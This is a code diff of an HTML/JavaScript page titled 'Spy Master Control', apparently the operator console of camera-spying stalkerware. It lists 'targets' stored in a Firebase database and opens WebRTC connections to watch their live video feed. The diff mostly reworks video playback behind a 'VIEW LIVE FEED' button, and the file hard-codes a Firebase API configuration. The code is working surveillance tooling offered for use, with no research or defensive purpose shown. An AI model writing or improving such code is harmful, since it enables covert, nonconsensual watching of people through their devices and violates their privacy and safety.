@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Spy Master Control</title>
-    
     <link rel="manifest" href="manifest.json">
     <meta name="theme-color" content="#0f0f0f">
 
@@ -14,7 +13,7 @@
     
     <style>
         body { background: #0f0f0f; color: white; font-family: 'Courier New', monospace; padding: 20px; }
-        h2 { color: #00ffcc; text-align: center; border-bottom: 2px solid #333; padding-bottom: 10px; letter-spacing: 2px; }
+        h2 { color: #00ffcc; text-align: center; border-bottom: 2px solid #333; padding-bottom: 10px; }
         
         #userList { list-style: none; padding: 0; }
         .user-card { 
@@ -23,35 +22,34 @@
             border: 1px solid #333; transition: 0.3s; 
         }
         .user-card:hover { background: #252525; border-color: #00ffcc; transform: translateX(5px); }
+        .online { background: #00ffcc; color: black; padding: 2px 8px; border-radius: 10px; font-weight: bold; }
         
-        .status-badge { font-size: 12px; padding: 4px 10px; border-radius: 12px; font-weight: bold; }
-        .online { background: #00ffcc; color: black; box-shadow: 0 0 10px #00ffcc; }
-        .offline { background: #444; color: #aaa; }
-
-        /* পপ-আপ ভিডিও প্লেয়ার */
+        /* ভিডিও কন্টেইনার */
         #videoContainer { 
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
             background: rgba(0,0,0,0.96); z-index: 999; text-align: center; padding-top: 40px; 
         }
         
-        /* 🔥 FIX: muted না থাকলে অটো প্লে হবে না */
+        /* ভিডিও স্টাইল */
         video { 
             width: 95%; max-width: 600px; 
             border: 3px solid #00ffcc; border-radius: 10px; 
             box-shadow: 0 0 30px rgba(0,255,204,0.4); 
-        }
-        
-        .btn-close { 
-            padding: 12px 30px; background: red; color: white; border: none; 
-            font-weight: bold; cursor: pointer; margin-top: 15px; border-radius: 5px; font-size: 16px;
+            background: black;
         }
 
-        /* ইন্সটল বাটন ডিজাইন */
-        #installBtn {
-            display: none; /* ডিফল্টভাবে লুকানো থাকবে */
-            width: 100%; padding: 10px; background: #333; color: #00ffcc; 
-            border: 1px dashed #00ffcc; margin-bottom: 20px; font-weight: bold; cursor: pointer;
+        .btn-close { padding: 10px 20px; background: red; color: white; border: none; font-weight: bold; margin-top: 15px; cursor: pointer; }
+        
+        /* 🔥 প্লে বাটন স্টাইল */
+        #playBtn {
+            display: none; /* শুরুতে লুকানো থাকবে */
+            padding: 15px 30px; background: #00ffcc; color: black; 
+            font-size: 18px; font-weight: bold; border: none; border-radius: 5px;
+            margin-top: 20px; cursor: pointer; animation: pulse 1.5s infinite;
         }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
+
+        #installBtn { display: none; width: 100%; padding: 10px; background: #333; color: #00ffcc; border: 1px dashed #00ffcc; cursor: pointer; }
     </style>
 </head>
 <body>
@@ -59,22 +57,22 @@
     <button id="installBtn" onclick="installApp()">📲 INSTALL SYSTEM APP</button>
 
     <h2>🕵️ MASTER CONTROL v3.0</h2>
-    <p style="text-align: center; color: #666;">Scanning global targets...</p>
-
     <h3>Active Targets:</h3>
     <ul id="userList"></ul>
 
     <div id="videoContainer">
         <h3 id="targetName" style="color: #00ffcc;">Connecting...</h3>
         
-        <video id="remoteVideo" autoplay playsinline controls muted></video>
+        <video id="remoteVideo" playsinline controls></video>
         
         <br>
+        <button id="playBtn" onclick="forcePlay()">▶ VIEW LIVE FEED</button>
+        <br>
+        
         <button class="btn-close" onclick="stopSpying()">DISCONNECT</button>
     </div>
 
     <script>
-        // --- তোর কনফিগারেশন ---
         const firebaseConfig = {
           apiKey: "AIzaSyBy5AGDGQFZqbL83fKQfLViX_pyOu6AJ38",
           authDomain: "phone-f605e.firebaseapp.com",
@@ -86,130 +84,98 @@
           measurementId: "G-WSJDCYKM3F"
         };
 
-        if (!firebase.apps.length) {
-            firebase.initializeApp(firebaseConfig);
-        }
+        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
-        
         let currentPeer = null;
         let currentTargetId = null;
 
-        // --- PWA INSTALL LOGIC ---
+        // PWA Install
         let deferredPrompt;
         const installBtn = document.getElementById('installBtn');
-
         window.addEventListener('beforeinstallprompt', (e) => {
             e.preventDefault();
             deferredPrompt = e;
-            installBtn.style.display = 'block'; // বাটন শো করবে
+            installBtn.style.display = 'block';
         });
-
         function installApp() {
             if (deferredPrompt) {
                 deferredPrompt.prompt();
-                deferredPrompt.userChoice.then((choiceResult) => {
-                    if (choiceResult.outcome === 'accepted') {
-                        installBtn.style.display = 'none';
-                    }
+                deferredPrompt.userChoice.then((res) => {
+                    if (res.outcome === 'accepted') installBtn.style.display = 'none';
                     deferredPrompt = null;
                 });
             }
         }
+        if ('serviceWorker' in navigator) navigator.serviceWorker.register('./sw.js');
 
-        // --- সার্ভিস ওয়ার্কার রেজিস্টার (বাধ্যতামূলক ইন্সটলের জন্য) ---
-        if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('./sw.js')
-            .then(() => console.log("System Ready for Install"));
-        }
-
-        // --- ইউজার লিস্ট লোড ---
+        // User List
         db.ref("users").on("value", snapshot => {
             const list = document.getElementById("userList");
             list.innerHTML = "";
-            
             snapshot.forEach(child => {
                 const uid = child.key;
                 const data = child.val();
-                
                 const isOnline = data.status === "online";
-                const email = data.email || "Unknown Target";
-
                 const li = document.createElement("li");
                 li.className = "user-card";
-                li.innerHTML = `
-                    <span>👤 ${email.split('@')[0]}</span> 
-                    <span class="status-badge ${isOnline ? 'online' : 'offline'}">${data.status.toUpperCase()}</span>
-                `;
-                
-                if(isOnline) {
-                    li.onclick = () => prepareConnection(uid, email);
-                } else {
-                    li.style.opacity = "0.5";
-                    li.style.cursor = "not-allowed";
-                }
+                li.innerHTML = `<span>👤 ${data.email.split('@')[0]}</span> <span class="online" style="background:${isOnline?'#00ffcc':'#555'}">${isOnline?'ONLINE':'OFFLINE'}</span>`;
+                if(isOnline) li.onclick = () => prepareConnection(uid, data.email);
                 list.appendChild(li);
             });
         });
 
-        // --- কানেকশন লজিক ---
         function prepareConnection(uid, email) {
             document.getElementById("videoContainer").style.display = "block";
             document.getElementById("targetName").innerText = "Handshaking with " + email + "...";
+            document.getElementById("playBtn").style.display = "none"; // বাটন রিসেট
             currentTargetId = uid;
-
-            // ১. আগের সব সিগন্যাল ডিলিট (ক্লিন স্লেট)
+            
             db.ref("users/" + uid + "/offer").remove();
-            db.ref("users/" + uid + "/answer").remove().then(() => {
-                startWebRTC(uid);
-            });
+            db.ref("users/" + uid + "/answer").remove().then(() => startWebRTC(uid));
         }
 
         function startWebRTC(targetId) {
             currentPeer = new SimplePeer({ 
                 initiator: true, 
-                trickle: false,
+                trickle: false, 
                 config: { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] } 
             });
 
-            currentPeer.on('signal', offer => {
-                db.ref("users/" + targetId + "/offer").set(offer);
-            });
+            currentPeer.on('signal', offer => db.ref("users/" + targetId + "/offer").set(offer));
 
             db.ref("users/" + targetId + "/answer").on("value", snapshot => {
-                const answer = snapshot.val();
-                if (answer && currentPeer) {
-                    currentPeer.signal(answer);
-                }
+                if (snapshot.val() && currentPeer) currentPeer.signal(snapshot.val());
             });
 
             currentPeer.on('stream', stream => {
                 const video = document.getElementById("remoteVideo");
                 video.srcObject = stream;
                 
-                // ভিডিও আসার পর প্লে করার চেষ্টা
-                video.play().catch(e => console.log("Auto-play blocked:", e));
-                
-                document.getElementById("targetName").innerText = "🔴 LIVE FEED: " + targetId;
+                // 🔥 ভিডিও কানেক্ট হলে বাটন দেখাবে
+                document.getElementById("targetName").innerText = "✅ CONNECTED! CLICK PLAY";
+                document.getElementById("playBtn").style.display = "inline-block";
             });
 
-            currentPeer.on('error', err => {
-                console.log(err);
-                alert("Connection failed. Target might have disconnected.");
-                stopSpying();
-            });
+            currentPeer.on('error', err => { alert("Connection Failed"); stopSpying(); });
+        }
+
+        // 🔥 ম্যানুয়াল প্লে ফাংশন
+        function forcePlay() {
+            const video = document.getElementById("remoteVideo");
+            video.play().then(() => {
+                document.getElementById("playBtn").style.display = "none"; // প্লে হলে বাটন গায়েব
+            }).catch(e => alert("Play Error: " + e));
         }
 
         function stopSpying() {
             if (currentPeer) currentPeer.destroy();
             currentPeer = null;
-            
             if (currentTargetId) {
                 db.ref("users/" + currentTargetId + "/offer").remove();
                 db.ref("users/" + currentTargetId + "/answer").remove();
             }
-            
             document.getElementById("videoContainer").style.display = "none";
-            location.reload(); 
+            location.reload();
         }
     </script>
 </body>
